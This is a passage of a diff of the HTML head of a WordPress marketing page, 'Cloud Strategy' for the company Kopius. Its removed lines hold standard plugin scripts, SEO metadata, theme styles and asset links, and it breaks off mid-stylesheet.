@@ -1,794 +1,1351 @@
 
 <!doctype html>
 <html lang="en-US">
+
 <head>
-	<meta charset="UTF-8">
-<script>
-var gform;gform||(document.addEventListener("gform_main_scripts_loaded",function(){gform.scriptsLoaded=!0}),window.addEventListener("DOMContentLoaded",function(){gform.domLoaded=!0}),gform={domLoaded:!1,scriptsLoaded:!1,initializeOnLoaded:function(o){gform.domLoaded&&gform.scriptsLoaded?o():!gform.domLoaded&&gform.scriptsLoaded?window.addEventListener("DOMContentLoaded",o):document.addEventListener("gform_main_scripts_loaded",o)},hooks:{action:{},filter:{}},addAction:function(o,n,r,t){gform.addHook("action",o,n,r,t)},addFilter:function(o,n,r,t){gform.addHook("filter",o,n,r,t)},doAction:function(o){gform.doHook("action",o,arguments)},applyFilters:function(o){return gform.doHook("filter",o,arguments)},removeAction:function(o,n){gform.removeHook("action",o,n)},removeFilter:function(o,n,r){gform.removeHook("filter",o,n,r)},addHook:function(o,n,r,t,i){null==gform.hooks[o][n]&&(gform.hooks[o][n]=[]);var e=gform.hooks[o][n];null==i&&(i=n+"_"+e.length),gform.hooks[o][n].push({tag:i,callable:r,priority:t=null==t?10:t})},doHook:function(n,o,r){var t;if(r=Array.prototype.slice.call(r,1),null!=gform.hooks[n][o]&&((o=gform.hooks[n][o]).sort(function(o,n){return o.priority-n.priority}),o.forEach(function(o){"function"!=typeof(t=o.callable)&&(t=window[t]),"action"==n?t.apply(null,r):r[0]=t.apply(null,r)})),"filter"==n)return r[0]},removeHook:function(o,n,t,i){var r;null!=gform.hooks[o][n]&&(r=(r=gform.hooks[o][n]).filter(function(o,n,r){return!!(null!=i&&i!=o.tag||null!=t&&t!=o.priority)}),gform.hooks[o][n]=r)}});
-</script>
-
-	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<link rel="profile" href="https://gmpg.org/xfn/11">
-
-	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
-
-<!-- Google Tag Manager for WordPress by gtm4wp.com -->
-<script data-cfasync="false" data-pagespeed-no-defer>
-	var gtm4wp_datalayer_name = "dataLayer";
-	var dataLayer = dataLayer || [];
-</script>
-<!-- End Google Tag Manager for WordPress by gtm4wp.com -->
-	<!-- This site is optimized with the Yoast SEO plugin v20.3 - https://yoast.com/wordpress/plugins/seo/ -->
-	<title>Cloud Strategy - Kopius</title>
-	<meta name="description" content="Understand your current ecosystem and use our cloud expertise to define how to move your business from yesterday’s to tomorrow’s cloud-forward world. Step into the future equipped with the full power of the cloud." />
-	<link rel="canonical" href="https://kopiustech.com/capabilities/cloud-strategy/" />
-	<meta property="og:locale" content="en_US" />
-	<meta property="og:type" content="article" />
-	<meta property="og:title" content="Cloud Strategy - Kopius" />
-	<meta property="og:description" content="Understand your current ecosystem and use our cloud expertise to define how to move your business from yesterday’s to tomorrow’s cloud-forward world. Step into the future equipped with the full power of the cloud." />
-	<meta property="og:url" content="https://kopiustech.com/capabilities/cloud-strategy/" />
-	<meta property="og:site_name" content="Kopius" />
-	<meta property="article:modified_time" content="2023-03-17T21:25:23+00:00" />
-	<meta property="og:image" content="https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited.jpg" />
-	<meta name="twitter:card" content="summary_large_image" />
-	<meta name="twitter:site" content="@valencelevel" />
-	<meta name="twitter:label1" content="Est. reading time" />
-	<meta name="twitter:data1" content="1 minute" />
-	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://kopiustech.com/capabilities/cloud-strategy/","url":"https://kopiustech.com/capabilities/cloud-strategy/","name":"Cloud Strategy - Kopius","isPartOf":{"@id":"https://kopiustech.com/#website"},"primaryImageOfPage":{"@id":"https://kopiustech.com/capabilities/cloud-strategy/#primaryimage"},"image":{"@id":"https://kopiustech.com/capabilities/cloud-strategy/#primaryimage"},"thumbnailUrl":"https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited.jpg","datePublished":"2021-07-01T02:45:45+00:00","dateModified":"2023-03-17T21:25:23+00:00","description":"Understand your current ecosystem and use our cloud expertise to define how to move your business from yesterday’s to tomorrow’s cloud-forward world. Step into the future equipped with the full power of the cloud.","breadcrumb":{"@id":"https://kopiustech.com/capabilities/cloud-strategy/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://kopiustech.com/capabilities/cloud-strategy/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://kopiustech.com/capabilities/cloud-strategy/#primaryimage","url":"https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited.jpg","contentUrl":"https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited.jpg","width":1667,"height":1667},{"@type":"BreadcrumbList","@id":"https://kopiustech.com/capabilities/cloud-strategy/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://kopiustech.com/"},{"@type":"ListItem","position":2,"name":"Capabilities","item":"https://kopiustech.com/capabilities/"},{"@type":"ListItem","position":3,"name":"Cloud Strategy"}]},{"@type":"WebSite","@id":"https://kopiustech.com/#website","url":"https://kopiustech.com/","name":"Kopius","description":"","publisher":{"@id":"https://kopiustech.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://kopiustech.com/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https://kopiustech.com/#organization","name":"Kopius","url":"https://kopiustech.com/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://kopiustech.com/#/schema/logo/image/","url":"https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark.png","contentUrl":"https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark.png","width":1140,"height":280,"caption":"Kopius"},"image":{"@id":"https://kopiustech.com/#/schema/logo/image/"},"sameAs":["https://twitter.com/valencelevel"]}]}</script>
-	<!-- / Yoast SEO plugin. -->
-
-
-<link rel='dns-prefetch' href='//www.google.com' />
-<link rel="alternate" type="application/rss+xml" title="Kopius &raquo; Feed" href="https://kopiustech.com/feed/" />
-<link rel="alternate" type="application/rss+xml" title="Kopius &raquo; Comments Feed" href="https://kopiustech.com/comments/feed/" />
-<script>
-window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/kopiustech.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=1679091487"}};
-/*! This file is auto-generated */
-!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode,e=(p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0),i.toDataURL());return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(p&&p.fillText)switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([129777,127995,8205,129778,127999],[129777,127995,8203,129778,127999])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
-</script>
-<style>
-img.wp-smiley,
-img.emoji {
-	display: inline !important;
-	border: none !important;
-	box-shadow: none !important;
-	height: 1em !important;
-	width: 1em !important;
-	margin: 0 0.07em !important;
-	vertical-align: -0.1em !important;
-	background: none !important;
-	padding: 0 !important;
-}
-</style>
-	<link rel='stylesheet' id='gravity_forms_theme_reset-css' href='https://kopiustech.com/wp-content/plugins/gravityforms/assets/css/dist/gravity-forms-theme-reset.min.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='gravity_forms_theme_foundation-css' href='https://kopiustech.com/wp-content/plugins/gravityforms/assets/css/dist/gravity-forms-theme-foundation.min.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='gravity_forms_theme_framework-css' href='https://kopiustech.com/wp-content/plugins/gravityforms/assets/css/dist/gravity-forms-theme-framework.min.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='gravity_forms_orbital_theme-css' href='https://kopiustech.com/wp-content/plugins/gravityforms/assets/css/dist/gravity-forms-orbital-theme.min.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='wp-block-library-css' href='https://kopiustech.com/wp-includes/css/dist/block-library/style.min.css?ver=1679091487' media='all' />
-<link rel='stylesheet' id='case_studies_block-cgb-style-css-css' href='https://kopiustech.com/wp-content/plugins/case-studies-block/dist/blocks.style.build.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='crown_client_honeycomb-cgb-style-css-css' href='https://kopiustech.com/wp-content/plugins/crown-client-honeycomb/dist/blocks.style.build.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='crown_connect-cgb-style-css-css' href='https://kopiustech.com/wp-content/plugins/crown-connect/dist/blocks.style.build.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='crown_header-cgb-style-css-css' href='https://kopiustech.com/wp-content/plugins/crown-header/dist/blocks.style.build.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='crown_image_hover-cgb-style-css-css' href='https://kopiustech.com/wp-content/plugins/crown-image-hover/dist/blocks.style.build.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='crown_studios-cgb-style-css-css' href='https://kopiustech.com/wp-content/plugins/crown-studios/dist/blocks.style.build.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='gradient_divider-cgb-style-css-css' href='https://kopiustech.com/wp-content/plugins/gradient-divider/dist/blocks.style.build.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='fontawesome-free-css' href='https://kopiustech.com/wp-content/plugins/getwid/vendors/fontawesome-free/css/all.min.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='slick-css' href='https://kopiustech.com/wp-content/plugins/getwid/vendors/slick/slick/slick.min.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='slick-theme-css' href='https://kopiustech.com/wp-content/plugins/getwid/vendors/slick/slick/slick-theme.min.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='fancybox-css' href='https://kopiustech.com/wp-content/plugins/getwid/vendors/fancybox/jquery.fancybox.min.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='getwid-blocks-css' href='https://kopiustech.com/wp-content/plugins/getwid/assets/css/blocks.style.css?ver=1679091486' media='all' />
-<style id='getwid-blocks-inline-css'>
-.wp-block-getwid-section .wp-block-getwid-section__wrapper .wp-block-getwid-section__inner-wrapper{max-width: 1160px;}
-</style>
-<link rel='stylesheet' id='classic-theme-styles-css' href='https://kopiustech.com/wp-includes/css/classic-themes.min.css?ver=1679091487' media='all' />
-<style id='global-styles-inline-css'>
-body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;}:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
-.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
-:where(.wp-block-columns.is-layout-flex){gap: 2em;}
-.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
-</style>
-<style id='wpxpo-global-style-inline-css'>
-:root {
-			--preset-color1: #037fff;
-			--preset-color2: #026fe0;
-			--preset-color3: #071323;
-			--preset-color4: #132133;
-			--preset-color5: #34495e;
-			--preset-color6: #787676;
-			--preset-color7: #f0f2f3;
-			--preset-color8: #f8f9fa;
-			--preset-color9: #ffffff;
-			}
-</style>
-<link rel='stylesheet' id='ultp-style-css' href='https://kopiustech.com/wp-content/plugins/ultimate-post/assets/css/style.min.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='dashicons-css' href='https://kopiustech.com/wp-includes/css/dashicons.min.css?ver=1679091487' media='all' />
-<link rel='stylesheet' id='wpmm_fontawesome_css-css' href='https://kopiustech.com/wp-content/plugins/wp-megamenu/assets/font-awesome-4.7.0/css/font-awesome.min.css?ver=1679091487' media='all' />
-<link rel='stylesheet' id='wpmm_icofont_css-css' href='https://kopiustech.com/wp-content/plugins/wp-megamenu/assets/icofont/icofont.min.css?ver=1679091487' media='all' />
-<link rel='stylesheet' id='wpmm_css-css' href='https://kopiustech.com/wp-content/plugins/wp-megamenu/assets/css/wpmm.css?ver=1679091487' media='all' />
-<link rel='stylesheet' id='wp_megamenu_generated_css-css' href='https://kopiustech.com/wp-content/uploads/wp-megamenu/wp-megamenu.css?ver=1679089918' media='all' />
-<link rel='stylesheet' id='featuresbox_css-css' href='https://kopiustech.com/wp-content/plugins/wp-megamenu/addons/wpmm-featuresbox/wpmm-featuresbox.css?ver=1679091487' media='all' />
-<link rel='stylesheet' id='postgrid_css-css' href='https://kopiustech.com/wp-content/plugins/wp-megamenu/addons/wpmm-gridpost/wpmm-gridpost.css?ver=1679091487' media='all' />
-<link rel='stylesheet' id='search-filter-plugin-styles-css' href='https://kopiustech.com/wp-content/plugins/search-filter-pro/public/assets/css/search-filter.min.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='weglot-css-css' href='https://kopiustech.com/wp-content/plugins/weglot/dist/css/front-css.css?ver=1679091486' media='' />
-<link rel='stylesheet' id='new-flag-css-css' href='https://kopiustech.com/wp-content/plugins/weglot/app/styles/new-flags.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='odometer-theme-default-css' href='https://kopiustech.com/wp-content/themes/valence/lib/odometer/odometer-theme-default.css?ver=1679091487' media='all' />
-<link rel='stylesheet' id='valence-style-css' href='https://kopiustech.com/wp-content/themes/valence/style.css?b-modified=1679091487&#038;ver=1679091487' media='all' />
-<link rel='stylesheet' id='valence-custom-css' href='https://kopiustech.com/wp-content/themes/valence/assets/css/custom.css?ver=1680539793' media='all' />
-<link rel='stylesheet' id='gform_basic-css' href='https://kopiustech.com/wp-content/plugins/gravityforms/assets/css/dist/basic.min.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='gform_theme_components-css' href='https://kopiustech.com/wp-content/plugins/gravityforms/assets/css/dist/theme-components.min.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='gform_theme_ie11-css' href='https://kopiustech.com/wp-content/plugins/gravityforms/assets/css/dist/theme-ie11.min.css?ver=1679091486' media='all' />
-<link rel='stylesheet' id='gform_theme-css' href='https://kopiustech.com/wp-content/plugins/gravityforms/assets/css/dist/theme.min.css?ver=1679091486' media='all' />
-<script src='https://kopiustech.com/wp-includes/js/jquery/jquery.min.js?ver=1679091487' id='jquery-core-js'></script>
-<script src='https://kopiustech.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1679091487' id='jquery-migrate-js'></script>
-<script src='https://kopiustech.com/wp-content/plugins/wp-megamenu/addons/wpmm-featuresbox/wpmm-featuresbox.js?ver=1679091487' id='featuresbox-style-js'></script>
-<script id='postgrid-style-js-extra'>
-var postgrid_ajax_load = {"ajax_url":"https:\/\/kopiustech.com\/wp-admin\/admin-ajax.php","redirecturl":"https:\/\/kopiustech.com\/"};
-</script>
-<script src='https://kopiustech.com/wp-content/plugins/wp-megamenu/addons/wpmm-gridpost/wpmm-gridpost.js?ver=1679091487' id='postgrid-style-js'></script>
-<script id='search-filter-plugin-build-js-extra'>
-var SF_LDATA = {"ajax_url":"https:\/\/kopiustech.com\/wp-admin\/admin-ajax.php","home_url":"https:\/\/kopiustech.com\/","extensions":[]};
-</script>
-<script src='https://kopiustech.com/wp-content/plugins/search-filter-pro/public/assets/js/search-filter-build.min.js?ver=1679091486' id='search-filter-plugin-build-js'></script>
-<script src='https://kopiustech.com/wp-content/plugins/search-filter-pro/public/assets/js/chosen.jquery.min.js?ver=1679091486' id='search-filter-plugin-chosen-js'></script>
-<script src='https://kopiustech.com/wp-content/plugins/weglot/dist/front-js.js?ver=1679091486' id='wp-weglot-js-js'></script>
-<script src='https://kopiustech.com/wp-content/themes/valence/lib/odometer/odometer.min.js?ver=1679091487' id='odometer-js'></script>
-<script src='https://kopiustech.com/wp-content/themes/valence/assets/js/custom.js?ver=1679091487' id='valence-scripts-js'></script>
-<script defer='defer' src='https://kopiustech.com/wp-content/plugins/gravityforms/js/jquery.json.min.js?ver=1679091486' id='gform_json-js'></script>
-<script id='gform_gravityforms-js-extra'>
-var gf_global = {"gf_currency_config":{"name":"U.S. Dollar","symbol_left":"$","symbol_right":"","symbol_padding":"","thousand_separator":",","decimal_separator":".","decimals":2,"code":"USD"},"base_url":"https:\/\/kopiustech.com\/wp-content\/plugins\/gravityforms","number_formats":[],"spinnerUrl":"https:\/\/kopiustech.com\/wp-content\/plugins\/gravityforms\/images\/spinner.svg","version_hash":"f71615be7e225a7fb9d6dbd943b88fc6","strings":{"newRowAdded":"New row added.","rowRemoved":"Row removed","formSaved":"The form has been saved.  The content contains the link to return and complete the form."}};
-var gform_i18n = {"datepicker":{"days":{"monday":"Mo","tuesday":"Tu","wednesday":"We","thursday":"Th","friday":"Fr","saturday":"Sa","sunday":"Su"},"months":{"january":"January","february":"February","march":"March","april":"April","may":"May","june":"June","july":"July","august":"August","september":"September","october":"October","november":"November","december":"December"},"firstDay":1,"iconText":"Select date"}};
-var gf_legacy_multi = {"1":""};
-var gform_gravityforms = {"strings":{"invalid_file_extension":"This type of file is not allowed. Must be one of the following:","delete_file":"Delete this file","in_progress":"in progress","file_exceeds_limit":"File exceeds size limit","illegal_extension":"This type of file is not allowed.","max_reached":"Maximum number of files reached","unknown_error":"There was a problem while saving the file on the server","currently_uploading":"Please wait for the uploading to complete","cancel":"Cancel","cancel_upload":"Cancel this upload","cancelled":"Cancelled"},"vars":{"images_url":"https:\/\/kopiustech.com\/wp-content\/plugins\/gravityforms\/images"}};
-</script>
-<script id='gform_gravityforms-js-before'>
-
-</script>
-<script defer='defer' src='https://kopiustech.com/wp-content/plugins/gravityforms/js/gravityforms.min.js?ver=1679091486' id='gform_gravityforms-js'></script>
-<script defer='defer' src='https://www.google.com/recaptcha/api.js?hl=en&#038;ver=6.1.1#038;render=explicit' id='gform_recaptcha-js'></script>
-<script defer='defer' src='https://kopiustech.com/wp-content/plugins/gravityforms/assets/js/dist/utils.min.js?ver=1679091486' id='gform_gravityforms_utils-js'></script>
-<link rel="https://api.w.org/" href="https://kopiustech.com/wp-json/" /><link rel="alternate" type="application/json" href="https://kopiustech.com/wp-json/wp/v2/pages/843" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://kopiustech.com/xmlrpc.php?rsd" />
-<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://kopiustech.com/wp-includes/wlwmanifest.xml" />
-<link rel='shortlink' href='https://kopiustech.com/?p=843' />
-<link rel="alternate" type="application/json+oembed" href="https://kopiustech.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fkopiustech.com%2Fcapabilities%2Fcloud-strategy%2F" />
-<link rel="alternate" type="text/xml+oembed" href="https://kopiustech.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fkopiustech.com%2Fcapabilities%2Fcloud-strategy%2F&#038;format=xml" />
-<meta name="cdp-version" content="1.3.9" /><style type="text/css">.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 623px !important;}.wp-megamenu > li.wp-megamenu-item-441.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 623px !important;left: calc(100% - 311.5px - 20px) !important}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-441>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-441>a { }li#wp-megamenu-item-441> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-441 a { }#wp-megamenu-item-441> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
